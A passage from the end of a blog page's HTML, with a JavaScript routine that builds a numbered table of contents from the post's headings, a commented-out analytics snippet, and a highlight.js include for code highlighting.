                      num = +elem.tagName.match(/\d/)[0];
                      if (num > lastNum) {
                          levelArr.push(1);
                          lastRevNum += 1;
                      } else if (num === lastRevNum ||
                          num > lastRevNum && num <= lastNum) {
                          levelArr.push(0);
                          lastRevNum = lastRevNum;
                      } else if (num < lastRevNum) {
                          levelArr.push(num - lastRevNum);
                          lastRevNum = num;
                      }
                      count += levelArr[levelArr.length - 1];
                      lastNum = num;
                      elem.id = elem.id || (id + guid++);
                      titleId.push(elem.id);
                  }
                  if (count !== 0 && levelArr[0] === 1) levelArr[0] = 0;

                  return levelArr;
              })(article, contentArr, titleId);
              currentList = root = document.createElement('ul');
              dirNum = [0];
              for (i = 0, len = levelArr.length; i < len; i++) {
                  level = levelArr[i];
                  if (level === 1) {
                      list = document.createElement('ul');
                      if (!currentList.lastElementChild) {
                          currentList.appendChild(document.createElement('li'));
                      }
                      currentList.lastElementChild.appendChild(list);
                      currentList = list;
                      dirNum.push(0);
                  } else if (level < 0) {
                      level *= 2;
                      while (level++) {
                          if (level % 2) dirNum.pop();
                          currentList = currentList.parentNode;
                      }
                  }
                  dirNum[dirNum.length - 1]++;
                  li = document.createElement('li');
                  link = document.createElement('a');
                  link.name = '#' + titleId[i];
                  link.href = 'Javascript:;'
                  link.className = "post-aside-anchor"
                  link.title = '访问' + titleId[i];
                  link.innerHTML = !isDirNum ? contentArr[i] :
                      dirNum.join('.') + ' ' + contentArr[i];
                  li.appendChild(link);
                  currentList.appendChild(li);
              }
            directory.appendChild(root);
          };
        createPostDirectory(document.getElementById('post-content'), directoryContainer, true);
      };
      postDirectoryBuild();
    </script>
    <script>
      // gtag('config', GA_TRACKING_ID, {
      //   'page_title' : 'Blog',
      //   'page_path': window.location.pathname,
      //   'post_title': 'watttsdfasdf',
      // });

    </script>
    <script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
    <script>
        lang = hljs.initHighlightingOnLoad();
    </script>
</body>

</html>
